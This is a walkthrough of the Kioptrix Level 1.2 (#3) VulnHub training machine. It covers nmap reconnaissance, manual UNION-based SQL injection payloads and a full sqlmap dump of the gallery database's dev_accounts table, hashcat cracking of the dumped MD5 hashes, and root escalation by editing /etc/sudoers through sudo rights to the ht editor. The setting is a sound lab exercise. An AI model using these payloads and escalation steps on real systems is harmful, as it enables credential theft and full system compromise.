## Machine Info

- **Name**: Kioptrix: Level 1.2 (#3)
- **Date release**: 18 Apr 2011
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: http://www.kioptrix.com/blog/?p=358

- **Vulnhub**: [Kioptrix: Level 1.2 (#3) ~ VulnHub](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)

## PWK

### recon

```
$ sudo nmap -sT -sV -sC -O -p22,80 $IP -oA nmap/detail
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 16:57 CST
Nmap scan report for kioptrix3.com (192.168.123.84)
Host is up (0.00052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Ligoat Security - Got Goat? Security ...
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
MAC Address: 00:0C:29:65:C4:91 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```

- 80 - http - key endpoint

- OS: Ubuntu 2.2.8

- Web: Apache, gallery CMS Ligoat

- check html code:

```
- view-source:http://kioptrix3.com/

name of author - Manjeet Singh Sawhney   www.manjeetss.com
LotusCMS

<!-- Leaving in my name and website link will be greatly appreciated in return for offering you this template for free. Thanking you in advance. -->
```

- CMS: LotusCMS

### exploit

#### LotusCMS [x]

This exp method is not recommended. Because RCE is discovered in **2012**, while this machine is released in **2011**.

```
$ searchsploit LotusCMS
[y] LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                             | php/remote/18565.rb
[x] LotusCMS 3.0.3 - Multiple Vulnerabilities                                                 | php/webapps/16982.txt
```

Simply exhibit the exp process:

![image-20231116063030864](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116063030864.png)

burp to capture this packet and change it to POST request:

![image-20231116063119167](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116063119167.png)

poc:

![image-20231116063155745](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116063155745.png)

get a shell:

![image-20231116063219680](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116063219680.png)

#### gallery

Check gallery cms, seek around vulns and find a sqli vuln:

![image-20231116063428596](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116063428596.png)

![image-20231116063446945](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116063446945.png)

##### manual sqli

- `?id=1 UNION ALL SELECT NULL,database(),version(),NULL,NULL,NULL -- -`
- `?id=1 UNION ALL SELECT NULL,group_concat(table_name),NULL,NULL,NULL,NULL from information_schema.tables where table_schema='gallery' -- -`

![image-20231116064218774](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116064218774.png)

- gallarific_users [x], dev_accounts [y]

- `?id=1 UNION ALL SELECT NULL,group_concat(column_name),NULL,NULL,NULL,NULL from information_schema.columns where table_schema='gallery' and table_name='dev_accounts' -- -`

![image-20231116064240158](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116064240158.png)

- `?id=1 UNION ALL SELECT NULL,group_concat(id,'~',username,'~',password),NULL,NULL,NULL,NULL from gallery.dev_accounts -- -`

![image-20231116064251080](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116064251080.png)

- crack passwords

```bash
dreg : 0d3eccfb887aabd50f243b3f155c0f85
loneferret : 5badcaf789d3d1d09794d8f021f40f0e

$ hashcat -m 0 -a 0 '0d3eccfb887aabd50f243b3f155c0f85' rockyou.txt --show
0d3eccfb887aabd50f243b3f155c0f85:Mast3r
$ hashcat -m 0 -a 0 '5badcaf789d3d1d09794d8f021f40f0e' rockyou.txt --show
5badcaf789d3d1d09794d8f021f40f0e:starwars
```

##### sqlmap

```bash
$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1'

$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1' -D gallery -T gallarific_users --dump # [x]

$ sqlmap -u 'http://kioptrix3.com/gallery/gallery.php?id=1' -D gallery -T dev_accounts --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.10#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:35:05 /2023-11-16/

[05:35:05] [INFO] resuming back-end DBMS 'mysql'
[05:35:05] [INFO] testing connection to the target URL
[05:35:05] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e324d68785c...c837c2c3b2'). Do you want to use those [Y/n]
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (8978=8978) THEN 1 ELSE (SELECT 8402 UNION SELECT 7981) END))

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(4218,6009)>(SELECT COUNT(*),CONCAT(0x71627a7a71,(SELECT (ELT(4218=4218,1))),0x716b766271,FLOOR(RAND(0)*2))x FROM (SELECT 2632 UNION SELECT 9035 UNION SELECT 9554 UNION SELECT 9939)a GROUP BY x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 7588 FROM (SELECT(SLEEP(5)))lcXH)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71627a7a71,0x4a71716c674d7a574567667369784c5578716251584c5343497964727167624a5244554d4d474f7a,0x716b766271),NULL,NULL,NULL,NULL-- -
---
[05:35:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP, PHP 5.2.4
back-end DBMS: MySQL >= 4.1
[05:35:06] [INFO] fetching columns for table 'dev_accounts' in database 'gallery'
[05:35:06] [INFO] retrieved: 'id','int(10)'
[05:35:06] [INFO] retrieved: 'username','varchar(50)'
[05:35:06] [INFO] retrieved: 'password','varchar(50)'
[05:35:06] [INFO] fetching entries for table 'dev_accounts' in database 'gallery'
[05:35:06] [INFO] retrieved: '1','0d3eccfb887aabd50f243b3f155c0f85','dreg'
[05:35:06] [INFO] retrieved: '2','5badcaf789d3d1d09794d8f021f40f0e','loneferret'
[05:35:06] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
do you want to crack them via a dictionary-based attack? [Y/n/q]
[05:35:09] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[05:35:13] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]
[05:35:15] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[05:35:15] [INFO] starting 4 processes
[05:35:16] [INFO] cracked password 'Mast3r' for user 'dreg'
[05:35:17] [INFO] cracked password 'starwars' for user 'loneferret'
Database: gallery
Table: dev_accounts
[2 entries]
+----+---------------------------------------------+------------+
| id | password                                    | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+

[05:35:19] [INFO] table 'gallery.dev_accounts' dumped to CSV file '/home/qwe/.local/share/sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv'
[05:35:19] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[05:35:19] [INFO] fetched data logged to text files under '/home/qwe/.local/share/sqlmap/output/kioptrix3.com'

[*] ending @ 05:35:19 /2023-11-16/
```

### priv-esc

creds:

- dreg:Mast3r
- loneferret:starwars

ssh to connect the machine:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa loneferret@$IP
loneferret@Kioptrix3:~$ sudo -l
sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

use ht to change /etc/sudoers

![image-20231116064048646](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116064048646.png)

![image-20231116064103240](./KIOPTRIX%20LEVEL%201.2%20(3).assets/image-20231116064103240.png)

```bash
loneferret@Kioptrix3:~$ sudo su root
root@Kioptrix3:/home/loneferret#

root@Kioptrix3:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:65:c4:91 brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.84/24 brd 192.168.123.255 scope global eth1
    inet6 fe80::20c:29ff:fe65:c491/64 scope link
       valid_lft forever preferred_lft forever
root@Kioptrix3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix3:~# whoami
root
root@Kioptrix3:~# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS:
http://www.lotuscms.org

Gallery application:
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```

